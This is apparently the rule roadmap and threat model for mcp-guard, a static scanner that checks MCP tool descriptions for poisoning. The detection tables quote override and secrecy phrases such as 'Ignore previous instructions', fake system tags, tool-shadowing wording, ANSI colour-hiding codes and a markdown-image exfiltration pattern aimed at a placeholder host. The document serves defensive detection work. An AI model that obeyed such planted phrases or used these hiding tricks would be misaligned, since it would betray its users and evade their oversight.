# mcp-guard rule roadmap & threat model

The path to 1.0. mcp-guard owns the **static** half of MCP defense — the tool / parameter / resource /
prompt descriptions and metadata present in C# source at build time. Runtime guards (live exfiltration,
cross-server topology) are out of scope and named in the [threat model](THREAT-MODEL.md).

Grounded in the OWASP MCP Top 10, the MCP spec security guidance, Invariant's mcp-scan and tool-poisoning
research, Trail of Bits' ANSI-in-MCP work, CyberArk's terminal-escape research, and the MCP-38 / MCPTox
taxonomies (see [Sources](#sources)).

## Shipped (on `main`)

| ID | Rule | Refinements pending |
|----|------|---------------------|
| MCPG001 | Prompt-injection / instruction-override phrasing | already includes secrecy phrasing; authority/coercion phrases extend into MCPG006 |
| MCPG002 | Hidden / non-printable Unicode (zero-width, bidi, BOM, tag chars; non-ESC controls) | **harden** — see below |
| MCPG003 | Sensitive credential / secret-file references | — |
| MCPG004 | Exfiltration directive (transmit verb + external destination + sensitivity) | **add markdown image/link sinks** |
| MCPG005 | ANSI / terminal-escape sequence poisoning | sequence-aware detection + code fix |

### Refinements to shipped rules

- **MCPG002 hardening.**
  1. **ZWJ false-positive trap** — don't blanket-flag `U+200D` (legitimate in emoji ZWJ sequences and
     Indic scripts). Special-case it.
  2. **Variation-selector runs** — catch runs of `U+FE00–U+FE0F` / `U+E0100–U+E01EF` (byte-smuggling),
     not just single invisibles.
  3. **Decode-and-show** — for Unicode-tag hits (`U+E0000–U+E007F`), decode the hidden text into the
     diagnostic message ("…an invisible instruction that said *Ignore previous instructions*").
- **MCPG004 — markdown sinks.** The stealthiest exfil channel is a *rendered* markdown image/link with
  data in the query string — `![x](http://host/?d={data})` — which has **no transmit verb**, so the
  three-signal rule misses it today. Add markdown image/link syntax to an external URL as a sink.
- **MCPG005 — sequence-aware.** Recognize the full CSI (`ESC[ … @–~`, incl. SGR colour-hiding and
  cursor/erase) and OSC (`ESC] … BEL`/`ST`, incl. OSC-8 hyperlink spoofing) sequences; the code fix
  strips the whole sequence, not just the `ESC` byte. ESC that begins a structured sequence is owned by
  MCPG005; MCPG002 keeps any bare/raw ESC.

## Backlog rules

| ID | Rule | Detect | FP risk | Severity |
|----|------|--------|---------|----------|
| MCPG006 | Manipulative / authority phrasing (extends 001) | "you must", "always call this first", "do not use other tools", fake urgency/authority | medium | Warning |
| MCPG007 | Capability ⇄ description **mismatch** | benign tool name/scope (`add`, `format_date`) but description claims file/network/shell reach | high | **Info / opt-in** |
| MCPG008 | Embedded HTML / system-tag markup | `<!-- … -->`, fake `<IMPORTANT>` / `<system>` tags — the delivery format for hidden instructions | medium | Warning |
| MCPG009 | Cross-tool / tool-shadowing references | imperative + reference to *another* tool by name + recipient/redirect ("when using the email tool, also BCC…") | medium | Warning |
| MCPG010 | Whitespace padding / off-screen hiding | long runs (≥ ~20) of spaces/tabs/newlines, or content after a big gap — *visible* whitespace, distinct from MCPG002 | low | Warning |
| MCPG011 | Encoded payload blobs | long base64 / hex-looking substrings (obfuscation channel) | high (hashes, URLs) | **Info** |

> **No standalone secrecy rule.** Secrecy / non-disclosure directives ("do not tell the user", "without
> telling the user", …) are already covered by **MCPG001**, so there is no separate rule; the multi-signal
> escalation below uses MCPG001 as its secrecy signal.
>
> **MCPG007** stays `Info`/opt-in until the capability⇄description mismatch heuristic exists — a raw
> capability-keyword match is noisy ("runs arbitrary shell commands" is often an accurate description,
> not an attack).

## Cross-cutting (value beyond any single rule)

- **Full metadata-surface coverage** *(highest leverage)* — run every detector on the whole surface.
  Method and **parameter** `[Description]`s are already covered; the gaps are **tool `Name` strings,
  enum-member `[Description]`s, and `[McpServerResource]` / `[McpServerPrompt]` descriptions**. A payload
  in any of those otherwise sails straight through; closing them multiplies all five shipped rules at once.
- **Multi-signal escalation** — when several signals fire on the *same symbol*, promote to `Error`:
  MCPG003 (secret ref) + MCPG004 (sink) + MCPG001 (injection/secrecy phrasing) together is essentially a
  confirmed exfil payload.
- **Severity hygiene** — keep fuzzy/capability rules (MCPG007, MCPG011) at `Info`/opt-in so the
  deterministic core stays trusted.
- **Robustness** — string extraction handles plain/verbatim/raw literals and `const` concatenation
  (done; interpolation cannot appear in attributes).

## Differentiator: description-integrity baseline (rug-pull) — **shipped (MCPG013)**

The one attack a runtime scanner catches but a text rule can't is the **rug-pull** — a description
changed *after* the user approved it. mcp-guard pins it in source: a committed `McpGuard.Baseline.txt`
of per-description fingerprints (added as an `AdditionalFiles`), with [MCPG013](rules/MCPG013.md) on
drift unless the baseline is deliberately updated. The fingerprint is over the raw bytes, so even an
invisible-character edit trips it. The feature is opt-in (inert until the baseline file exists). This is
the "does what runtime scanners structurally can't" story for the *source-level* rug-pull; runtime
mutation by a third-party server stays out of scope.

## Out of scope — runtime only

Documented in the [threat model](THREAT-MODEL.md): live exfiltration / network behavior, tool shadowing
across *connected* servers at runtime, cross-server confused-deputy / toxic-flow, and tool **output**
ANSI poisoning (mcp-guard sees descriptions in source, not runtime output).

## Test corpus & evals

Each `MCPGxxx`: a positive fixture (fires), a clean look-alike (stays quiet), plus a Unicode/escape
fixture where relevant. Real-attack corpora to draw from:

- `invariantlabs-ai/mcp-injection-experiments` — poisoning + WhatsApp exfil + rug-pull PoCs.
- Trail of Bits ANSI-in-MCP PoC (`\x1B[38;5;231;49m` white-on-white) — the canonical MCPG005 fixture.
- `aminrj-labs/mcp-attack-labs` — offline reproducible poisoned servers.
- MCPTox (arXiv 2508.14925) — tool-poisoning benchmark.
- `roslyn-codelens-mcp` CVE GHSA-552p-8f74-6x7q — the README "this is real" example.

## Sources

- Trail of Bits — *Deceiving users with ANSI terminal codes in MCP* — <https://blog.trailofbits.com/2025/04/29/deceiving-users-with-ansi-terminal-codes-in-mcp/>
- CyberArk — *Abusing Terminal Emulators with ANSI Escape Characters*
- Invariant Labs — Tool Poisoning Attacks + `mcp-injection-experiments`
- *MCP-38: A Threat Taxonomy for MCP* — arXiv 2603.18063
- AWS Security — *Defending LLM apps against Unicode character smuggling* (Sep 2025)
- OWASP MCP Top 10 — <https://owasp.org/www-project-mcp-top-10/>
- OSC 8 hyperlink spec — <https://gist.github.com/egmontkob/eb114294efbcd5adb1944c9f3cb5feda>
